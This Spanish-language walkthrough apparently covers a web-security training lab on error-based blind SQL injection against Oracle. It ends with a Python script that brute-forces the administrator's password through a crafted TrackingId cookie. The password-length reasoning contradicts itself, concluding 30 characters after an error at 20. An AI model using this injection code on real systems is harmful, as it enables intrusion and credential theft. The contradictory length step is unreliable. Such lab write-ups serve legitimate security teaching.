-------

En este caso, tocaremos casi lo mismo que en el caso anterior, aunque provocando **errores intencionados**. 

En el caso anterior, resolvimos el laboratorio en base a las respuestas que nos enviaba el servidor, aquí lo haremos en base a los errores que recibimos.

### Explicación del laboratorio

![[132.png]]


![[133.png]]

Este laboratorio contiene una base de datos con la tabla ***users*** y el usuario ***administrator***, el objetivo es conseguir su contraseña para iniciar sesión. 

Para poder saber como es la contraseña, tendremos que provocar errores dentro del servidor para así poder ver como reacciona a las consultas.

El laboratorio nos dice que la base de datos es de **Oracle**, así que podemos empezar a resolver:

![[134.png]]


----

### Resolución del laboratorio

Vamos a empezar interceptando solicitudes, en este caso ya podemos ver la misma estructura que el caso anterior. 

![[135.png]]

Nos quedaremos principalmente con **3 elementos**: 

- ***Host***
- ***Tracking Id***
- ***Session***

Si enviamos esta solicitud al servidor, sin cambiar nada, recibiremos esto:

![[136.png]]

En este caso, no hay errores, así que vamos a modificar el apartado de **Tracking ID** con lo siguiente:

![[137.png]]

Lo que estamos haciendo aquí es comprobar si realmente existe el usuario ***administrator*** dentro de la base de datos, creamos una condición que en caso de que 1 sea igual a 1, se trate de dividir un número entre 0, ésta devuelva un error, y en caso de que la condición no se cumpla, que no haga nada.

Al ejecutar la consulta, nos devuelve un error: **500 internal server error** 

Ahora que sabemos que existe un usuario llamado ***administrator***, vamos a comprobar la longitud de su contraseña, esto lo hacemos para saber como de grande puede ser, para después adivinar sus caracteres.

Modificamos esta parte de la consulta anterior: 

```
(select case when(1=1)
```

Y lo cambiamos por esto, el resto se queda igual:

![[138.png]]

El número **30** corresponde a la cantidad de caracteres que puede tener la contraseña, si ejecutamos la consulta:

![[139.png]]

No nos devuelve error, eso es que la contraseña no tiene **30** caracteres

![[140.png]]

Si volvemos a probar con **20** caracteres: 

![[141.png]]

Recibimos un error, es decir, la contraseña tiene **30** caracteres, y ahora toca adivinar cuales son, para ello podemos usar este código en Python: 

```python
#!/usr/bin/env python3

from pwn import *
import requests, sys, signal, string
import time

def def_handler(sig, frame):
	print(f"\n[!] Saliendo...\n")
	p1.failure("Ataque de fuerza bruta detenido")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

p1 = log.progress("SQLi")

characters = string.ascii_lowercase + string.digits


def makeSQLi():

	p1.status("Iniciando ataque de fuerza bruta")
	
	time.sleep(2)

	password = ""
	
	p2 = log.progress("Password")


	for position in range (1, 21):
		for character in characters:
			cookies = {
						'TrackingId': f"A50CqGNsf9uKm0u2'||(select case when substr(password,{position},1)='{character}' then to_char(1/0) else '' end from users where username='administrator')||'",

					'session': "g2CLXwVEKY5JIBpuh3Ra6LyMibfvSHx6"

			}

			p1.status(cookies["TrackingId"])

			r = requests.get("https://0af800fc03919a4180e71ca100c50070.web-security-academy.net/", cookies=cookies)

			if r.status_code == 500:
				password += character
				p2.status(password)
				break

  

if __name__ == '__main__':
	makeSQLi()
```

#### Importante cambiar la URL, el Tracking ID y la session para evitar problemas en la ejecución del programa

Al ejecutar el programa, veremos la contraseña:

![[143.png]]

Ahora, podemos iniciar sesión y terminar el laboratorio:

![[142.png]]

